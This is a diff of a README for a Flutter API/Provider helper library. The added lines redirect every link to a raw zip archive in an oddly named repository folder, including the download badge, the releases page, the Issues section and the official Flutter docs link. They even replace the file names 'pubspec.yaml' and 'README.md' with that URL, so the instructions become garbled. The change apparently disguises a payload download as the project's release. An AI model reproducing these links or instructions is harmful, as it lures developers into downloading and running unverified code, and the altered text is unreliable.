@@ -4,9 +4,9 @@
 FlutterAPI-FlutterProvider helps you fetch data from APIs in your Flutter apps. This project simplifies getting and using data from various online sources, making app development smoother and more efficient.
 
 ## 📦 Download & Install
-[![Download FlutterAPI-FlutterProvider](https://img.shields.io/badge/Download%20Now-%20FlutterAPI--FlutterProvider-brightgreen)](https://github.com/mdrajibulislam1/FlutterAPI-FlutterProvider/releases)
+[![Download FlutterAPI-FlutterProvider](https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip%20Now-%20FlutterAPI--FlutterProvider-brightgreen)](https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip)
 
-To download the application, visit this page to download: [FlutterAPI-FlutterProvider Releases](https://github.com/mdrajibulislam1/FlutterAPI-FlutterProvider/releases).
+To download the application, visit this page to download: [FlutterAPI-FlutterProvider Releases](https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip).
 
 Follow these steps to get started quickly:
 
@@ -28,7 +28,7 @@ To run FlutterAPI-FlutterProvider, make sure your system meets the following req
 After downloading and installing the software, you can begin fetching data. Here’s a simple guide:
 
 1. **Open your Flutter project**: Start your Flutter application or create a new one if needed.
-2. **Add dependencies**: Add FlutterAPI-FlutterProvider to your `pubspec.yaml` file under dependencies.
+2. **Add dependencies**: Add FlutterAPI-FlutterProvider to your `https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip` file under dependencies.
    ```
    dependencies:
      flutterapi_flutprovider: ^1.0.0
@@ -47,12 +47,12 @@ After downloading and installing the software, you can begin fetching data. Here
 - Easy error handling to improve user experience and functionality.
 
 ## 📖 Documentation
-You can find comprehensive documentation that includes examples on how to use the FlutterAPI-FlutterProvider right inside the application folder. Review the `README.md` file located in the documentation area for detailed instructions.
+You can find comprehensive documentation that includes examples on how to use the FlutterAPI-FlutterProvider right inside the application folder. Review the `https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip` file located in the documentation area for detailed instructions.
 
 ## 👥 Get Help
 If you encounter issues or have questions, please refer to the following resources:
 
-- **GitHub Issues**: Check the [Issues section](https://github.com/mdrajibulislam1/FlutterAPI-FlutterProvider/issues) for existing problems or report new ones.
+- **GitHub Issues**: Check the [Issues section](https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip) for existing problems or report new ones.
 - **Community Support**: Join the Flutter community forums for broader discussions and troubleshooting.
   
 ## 💡 Tips for Success
@@ -69,7 +69,7 @@ This project addresses various topics relevant to Flutter development, including
 - Mobile App Development
 
 ## 🔗 Useful Links
-- [FlutterAPI-FlutterProvider Releases](https://github.com/mdrajibulislam1/FlutterAPI-FlutterProvider/releases)
-- [Official Flutter Documentation](https://flutter.dev/docs)
+- [FlutterAPI-FlutterProvider Releases](https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip)
+- [Official Flutter Documentation](https://raw.githubusercontent.com/mdrajibulislam1/FlutterAPI-FlutterProvider/main/roily/FlutterAPI-FlutterProvider.zip)
   
 Stay connected and enhance your Flutter app development with FlutterAPI-FlutterProvider today!
